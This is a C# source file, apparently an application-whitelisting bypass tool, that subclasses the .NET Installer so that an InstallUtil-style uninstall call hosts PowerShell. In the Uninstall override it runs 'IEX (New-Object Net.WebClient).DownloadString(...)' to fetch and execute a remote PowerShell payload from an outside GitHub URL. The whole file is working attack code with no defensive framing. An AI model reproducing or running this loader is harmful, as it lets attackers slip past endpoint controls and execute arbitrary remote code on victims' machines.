using System;
using System.Management.Automation;
using System.Configuration.Install;
using System.Collections;
using System.Collections.Specialized;
using System.Reflection;
using System.Runtime.CompilerServices;
// edit the .csproj to add this reference.
namespace Whitelist
{
    class Program
    {
        public static void AutoPublish()
        {
            try
            {
                using (AssemblyInstaller ai = new AssemblyInstaller())
                {
                    IDictionary idt = new Hashtable();
                    ai.UseNewContext = true;
                    ai.Path = Assembly.GetCallingAssembly().Location;
                    ai.Uninstall(idt);
                }
            }
            catch (Exception ex)
            { Console.WriteLine("error: \n" + ex.ToString()); }
        }

        static void Main(string[] args)
        {
            AutoPublish();
        }
    }
}
[System.ComponentModel.RunInstaller(true)]
// Install need be added in reference, just put "install" in search box.
public class Sample : System.Configuration.Install.Installer
{

    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        PowerShell ps = PowerShell.Create();
        ps.AddCommand("Invoke-Expression");
        ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp4InstallUntil/Csharp4InstallUntil.ps1')");
        ps.Invoke();
    }
}

